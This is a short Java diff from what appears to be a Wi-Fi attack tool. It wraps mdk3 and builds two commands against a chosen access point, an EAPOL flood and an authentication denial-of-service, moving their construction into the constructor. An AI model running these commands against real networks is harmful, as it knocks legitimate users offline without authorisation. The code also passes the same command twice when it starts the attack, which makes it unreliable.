@@ -19,8 +19,8 @@ public class Mdk3_manager {
     private String PSK;
     private String PIN;
     private List<AccessPoint> APs;
-    private String Mdk3_eapol = "sudo mdk3 "+ MON_X + " x 0 -t  " + BSSID + " -n \"" + SSID +"\" -s 150";
-    private String Mdk3_dos = "sudo mdk3 " + MON_X + " a -a " + BSSID +" -m ";
+    private String Mdk3_eapol;
+    private String Mdk3_dos;
 
 
     public Mdk3_manager(List<AccessPoint> accessPoints , Adapter adapter){
@@ -35,10 +35,17 @@ public class Mdk3_manager {
         SSID = currentAP.getEssid();
         ch = currentAP.getChanel();
         MON_X = adapter.getInterface();
+         Mdk3_eapol = "sudo mdk3 "+ MON_X + " x 0 -t  " + BSSID + " -n \"" + SSID +"\" -s 150";
+         Mdk3_dos = "sudo mdk3 " + MON_X + " a -a " + BSSID +" -m ";
     }
 
     public void executeRunner(){
         Runner runner = new Runner(Mdk3_eapol,Mdk3_eapol);
         runner.startMDK3();
+        /*try {
+            //Thread.sleep(60000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }*/
     }
 }
